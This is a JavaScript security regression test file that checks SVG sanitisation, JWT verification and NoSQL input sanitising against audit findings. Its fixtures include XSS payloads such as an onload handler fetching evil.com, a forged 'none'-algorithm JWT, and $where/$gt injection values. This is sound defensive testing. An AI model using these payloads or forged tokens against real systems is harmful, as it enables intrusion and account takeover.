import { describe, test } from "node:test";
import assert from "node:assert/strict";
import jwt from "jsonwebtoken";
import { sanitizeSvg } from "../src/utils/sanitizeSvg.js";
import { loadEnv } from "../src/config/env.js";
import { sanitizeInputs } from "../src/middlewares/mongoSanitize.middleware.js";

describe("Security Hardening & Vulnerability Regression Tests", () => {
  describe("SVG & Poster XSS Sanitization (Finding H-1)", () => {
    test("strips <script> tags and embedded executable code", () => {
      const maliciousSvg = `<svg viewBox="0 0 100 100"><script>alert('XSS')</script><circle cx="50" cy="50" r="40"/></svg>`;
      const clean = sanitizeSvg(maliciousSvg);
      assert.ok(!clean.includes("<script"));
      assert.ok(!clean.includes("alert("));
      assert.ok(clean.includes("<circle"));
    });

    test("strips inline event handlers (onload, onerror, onclick)", () => {
      const maliciousSvg = `<svg onload="fetch('//evil.com')" onerror="alert(1)"><rect onmouseover="steal()" width="100" height="100"/></svg>`;
      const clean = sanitizeSvg(maliciousSvg);
      assert.ok(!clean.includes("onload"));
      assert.ok(!clean.includes("onerror"));
      assert.ok(!clean.includes("onmouseover"));
      assert.ok(!clean.includes("fetch("));
    });

    test("strips <foreignObject> tags used for arbitrary HTML injection", () => {
      const maliciousSvg = `<svg><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert('pwned')</script></body></foreignObject></svg>`;
      const clean = sanitizeSvg(maliciousSvg);
      assert.ok(!clean.includes("foreignObject"));
      assert.ok(!clean.includes("alert("));
    });

    test("strips javascript: pseudo-protocols in links", () => {
      const maliciousSvg = `<svg><a href="javascript:alert(1)"><text>Click</text></a><a xlink:href="javascript:evil()"><text>Link</text></a></svg>`;
      const clean = sanitizeSvg(maliciousSvg);
      assert.ok(!clean.includes("javascript:"));
    });

    test("preserves valid aesthetic SVG elements, gradients, and styling", () => {
      const validSvg = `<svg viewBox="0 0 800 1120" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="bg"><stop offset="0%" stop-color="#1e1e2f"/></linearGradient></defs><rect width="800" height="1120" fill="url(#bg)"/><text x="400" y="300" text-anchor="middle">Gala Celebration</text></svg>`;
      const clean = sanitizeSvg(validSvg);
      assert.ok(clean.includes("linearGradient"));
      assert.ok(clean.includes("Gala Celebration"));
      assert.ok(clean.includes("viewBox="));
    });
  });

  describe("JWT Security & Algorithm Confusion (Finding H-2)", () => {
    const TEST_SECRET = "security-audit-test-secret-32-chars-long";

    test("rejects tokens signed with 'none' algorithm", () => {
      // Craft an unverified token with 'none' algorithm
      const noneHeader = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
      const payload = Buffer.from(JSON.stringify({ id: "user123" })).toString("base64url");
      const forgedToken = `${noneHeader}.${payload}.`;

      assert.throws(() => {
        jwt.verify(forgedToken, TEST_SECRET, { algorithms: ["HS256"] });
      });
    });

    test("rejects tokens signed with a different key", () => {
      const legitimateToken = jwt.sign({ id: "user123" }, "wrong-secret-key", { algorithm: "HS256" });
      assert.throws(() => {
        jwt.verify(legitimateToken, TEST_SECRET, { algorithms: ["HS256"] });
      });
    });

    test("enforces secure JWT_SECRET in production mode", () => {
      // Must throw if JWT_SECRET is unset in production
      assert.throws(() => {
        loadEnv({ NODE_ENV: "production", JWT_SECRET: "" });
      }, /JWT_SECRET must be configured/);

      // Must throw if JWT_SECRET is default in production
      assert.throws(() => {
        loadEnv({ NODE_ENV: "production", JWT_SECRET: "changeme-in-production" });
      }, /JWT_SECRET must be configured/);

      // Must succeed when a valid secret is provided in production
      const prodEnv = loadEnv({ NODE_ENV: "production", JWT_SECRET: "super-secure-production-key-32-chars-long" });
      assert.equal(prodEnv.jwtSecret, "super-secure-production-key-32-chars-long");
    });
  });

  describe("NoSQL Injection Sanitization (Finding M-2)", () => {
    test("recursively removes $ operators from request body and query", () => {
      const req = {
        body: {
          email: "user@example.com",
          $gt: "",
          nested: {
            $where: "sleep(5000)",
            validField: "good",
          },
        },
        params: { id: "123" },
        query: { "user.role": "admin", filter: "normal" },
      };

      sanitizeInputs(req, {}, () => {});

      assert.equal(req.body.$gt, undefined);
      assert.equal(req.body.nested.$where, undefined);
      assert.equal(req.body.nested.validField, "good");
      assert.equal(req.body.email, "user@example.com");
      assert.equal(req.query["user.role"], undefined);
      assert.equal(req.query.filter, "normal");
    });
  });
});
